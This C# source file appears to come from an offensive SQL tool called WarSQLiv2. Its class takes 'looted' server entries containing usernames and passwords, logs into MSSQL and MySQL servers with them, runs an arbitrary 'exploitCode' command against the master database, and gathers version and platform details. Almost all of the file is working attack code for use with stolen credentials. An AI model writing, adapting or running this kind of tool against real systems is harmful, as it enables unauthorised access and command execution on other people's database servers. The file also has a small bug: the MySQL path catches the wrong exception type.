using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MySql.Data.MySqlClient;

namespace WarSQLiv2.Exploitation.Control
{
    class ToolStripInformation
    {
        private string _sqlServerInfo;
        private string _exception;
        private string _mySqlUserName;
        private string _mySqlUserPass;
        /// <summary>
        /// Fırlatılan Exception'ı yakalayıp kullanıcıya göstermek için kullanılacak
        /// </summary>
        public string Exception
        {
            get { return _exception; }
            set
            {
                _exception = string.Empty;
                _exception = value;
            }
        }
        public string SqlServerInfo
        {
            get { return _sqlServerInfo; }
        }
        public List<string> LootedList { get; set; }
        /// <summary>
        /// Seçilen Listbox item'ını SelectedItem değerine mutlaka set etmemiz gerekir. Bu değer lstLooted'ın selectedItems'ının değeri olmalıdır.
        /// </summary>
        public string SelectedLootedServer { get; set; }
        public string Command { get; set; }
        public string MySqlUserName { get; set; }
        public string MySqlUserPass { get; set; }

        public void SqlServerInformation()
        {
            LootedControl();
            var changeLang = new LanguageControl();
            changeLang.FindLang();
            var exploitCode = Command;
            if (!string.IsNullOrEmpty(SelectedLootedServer))
            {
                var parcala = SelectedLootedServer.Split(':');
                var server = parcala[0];
                var user = parcala[2];
                var pass = parcala[3];
                var conS = "Server=" + server + ";Database=master;Uid=" + user + ";Pwd=" + pass + ";";
                try
                {
                    var conn = new SqlConnection(conS);
                    var cmd = new SqlCommand(exploitCode, conn);
                    conn.Open();
                    var rdr = cmd.ExecuteReader();
                    _sqlServerInfo = string.Empty;
                    var sqlInfo = new List<string>();
                    while (rdr.Read())
                    {
                        sqlInfo.Add($"{Environment.NewLine}{rdr[2]}");
                    }
                    _sqlServerInfo = "Server IP: " + parcala[0] + " Server Version: " + sqlInfo[1].Replace("\r\n", "");
                    rdr.Close();
                    conn.Close();

                }
                catch (SqlException exp)
                {
                    Exception = string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, changeLang.SelectedLanguage.GetString("GeneralError1"), changeLang.SelectedLanguage.GetString("GeneralError2"));
                }
            }
            else
            {
                Exception = $"{Environment.NewLine}{changeLang.SelectedLanguage.GetString("MessageExploitError1")}";
            }
        }

        public void MySqlServerInformation()
        {
            LootedControl();
            var changeLang = new LanguageControl();
            changeLang.FindLang();
            if (!string.IsNullOrEmpty(SelectedLootedServer))
            {
                var split = SelectedLootedServer.Split(':');
                var server = split[0];
                var user = split[2];
                var pass = split[3];
                var con = new MySqlConnectionStringBuilder() { Server = server, UserID = user, Password = pass };
                var mysqlConn = new MySqlConnection(con.ToString());
                try
                {
                    const string addUserCmd = "SHOW GLOBAL VARIABLES LIKE '%version%';";
                    var cmd = new MySqlCommand(addUserCmd, mysqlConn);
                    mysqlConn.Open();
                    var rdr = cmd.ExecuteReader();
                    _sqlServerInfo = string.Empty;
                    var sqlInfo = new List<string>();
                    while (rdr.Read())
                    {
                        sqlInfo.Add($"{Environment.NewLine}{rdr[1]}");
                    }
                    rdr.Close();
                    mysqlConn.Close();
                    _sqlServerInfo = " Server Version: " + sqlInfo[3].Replace("\r\n", "") + " Innodb_Version: " + sqlInfo[0].Replace("\r\n", "") + " Platform: " + sqlInfo[6].Replace("\r\n", "");
                }
                catch (SqlException exp)
                {
                    Exception = string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, changeLang.SelectedLanguage.GetString("GeneralError1"), changeLang.SelectedLanguage.GetString("GeneralError2"));
                }
            }
            else
            {
                Exception = $"{Environment.NewLine}{changeLang.SelectedLanguage.GetString("MessageExploitError1")}";
            }
        }
        private void LootedControl()
        {
            var lootedFileControl = new LootedFileControl();
            try
            {
                lootedFileControl.FileControl();
                var lootedList = lootedFileControl.LootedList;
                foreach (var t in lootedList)
                {
                    LootedList.Add(t);
                }
            }
            catch (Exception exp)
            {
                Exception = lootedFileControl.Exception;
            }
        }
    }
}
